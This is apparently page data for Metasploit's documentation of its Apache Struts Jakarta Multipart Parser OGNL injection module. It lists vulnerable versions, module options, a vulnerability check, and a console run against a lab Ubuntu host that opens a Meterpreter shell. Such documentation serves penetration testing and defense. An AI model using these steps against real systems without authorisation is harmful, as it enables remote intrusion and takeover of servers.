{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/struts2_content_type_ognl","result":{"data":{"moduleMetadataJson":{"id":"95607ae9-f40d-5444-bc0f-6ca5d982646f","name":"Apache Struts Jakarta Multipart Parser OGNL Injection","fullname":"exploit/multi/http/struts2_content_type_ognl","description":"This module exploits a remote code execution vulnerability in Apache Struts\n        version 2.3.5 - 2.3.31, and 2.5 - 2.5.10. Remote Code Execution can be performed\n        via http Content-Type header.\n\n        Native payloads will be converted to executables and dropped in the\n        server's temp dir. If this fails, try a cmd/* payload, which won't\n        have to write to the disk.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/struts2_content_type_ognl","documentationSlug":"/modules/documentation/exploit/multi/http/struts2_content_type_ognl"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p><code class=\"language-text\">struts2_content_type_ognl</code> is a module that exploits Apache Struts 2's Jakarta Multipart\nparser, which makes it possible to perform arbitrary code execution with a malicious HTTP\n<code class=\"language-text\">Content-Type</code> value.</p>\n<p>Apache Struts version 2.3.5 - 2.3.31, and 2.5 - 2.5.10 are vulnerable.</p>\n<p>You can download these versions here with any version of Apache Tomcat:</p>\n<p><a href=\"http://archive.apache.org/dist/struts/\">http://archive.apache.org/dist/struts/</a></p>\n<p>You will also need to install a Struts 2 showcase application, which can be found here:</p>\n<p><a href=\"https://mvnrepository.com/artifact/org.apache.struts/struts2-showcase\">https://mvnrepository.com/artifact/org.apache.struts/struts2-showcase</a></p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>TARGETURI</strong></p>\n<p>The path to a struts application action</p>\n<p><strong>VHOST</strong></p>\n<p>The HTTP server virtual host. You will probably need to configure this as well, even though it is\nset as optional.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p><strong>The Check Command</strong></p>\n<p>The <code class=\"language-text\">struts2_content_type_ognl</code> module comes with a check command that can effectively check\nif the remote host is vulnerable or not. To use this, configure the msfconsole similar to the\nfollowing:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">set VERBOSE true\nset RHOST [IP]\nset TARGETURI [path to the Struts app with an action]</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>When the module is in verbose mode, the <code class=\"language-text\">check</code> command will try to tell you the OS information,\nand whether or not the machine is vulnerable. Like this:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(struts2_content_type_ognl) &gt; check\n\n[+] Victim operating system: Linux\n[+] 10.1.11.11:8080 The target is vulnerable.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>Exploiting the Host</strong></p>\n<p>After identifying the vulnerability on the target machine, you can try to exploit it.</p>\n<p>The exploit supports mainly two platforms: Windows and Linux. To see a list of available payloads,\ntry to do <code class=\"language-text\">show payloads</code>, and pick one. The following example demonstrates us exploiting a\nvulnerable Ubuntu host:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(struts2_content_type_ognl) &gt; show options\n\nModule options (exploit/multi/http/struts2_content_type_ognl):\n\n   Name       Current Setting     Required  Description\n   ----       ---------------     --------  -----------\n   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOST      10.1.11.11          yes       The target address\n   RPORT      8080                yes       The target port (TCP)\n   SSL        false               no        Negotiate SSL/TLS for outgoing connections\n   TARGETURI  /struts2-showcase/  yes       The path to a struts application action\n   VHOST                          no        HTTP server virtual host\n\n\nPayload options (linux/x86/meterpreter/bind_tcp):\n\n   Name          Current Setting  Required  Description\n   ----          ---------------  --------  -----------\n   DebugOptions  0                no        Debugging options for POSIX meterpreter\n   LPORT         4444             yes       The listen port\n   RHOST         10.1.11.11       no        The target address\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Universal\n\n\nmsf exploit(struts2_content_type_ognl) &gt; run\n\n[*] Started bind handler\n[*] Transmitting intermediate stager for over-sized stage...(105 bytes)\n{&quot;Server&quot;=&gt;&quot;Apache-Coyote/1.1&quot;,\n &quot;Set-Cookie&quot;=&gt;&quot;JSESSIONID=548FF051466E6C1F3AAE814E385057DE; Path=/; HttpOnly&quot;,\n &quot;Content-Type&quot;=&gt;&quot;text/html;charset=UTF-8&quot;,\n &quot;Content-Length&quot;=&gt;&quot;6335&quot;,\n &quot;Date&quot;=&gt;&quot;Tue, 14 Mar 2017 21:04:06 GMT&quot;}\n[*] Sending stage (1495599 bytes) to 10.1.11.11\n[*] Meterpreter session 5 opened (192.168.1.11:50671 -&gt; 10.1.11.11:4444) at 2017-03-14 16:04:36 -0500\n\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"95607ae9-f40d-5444-bc0f-6ca5d982646f"}}}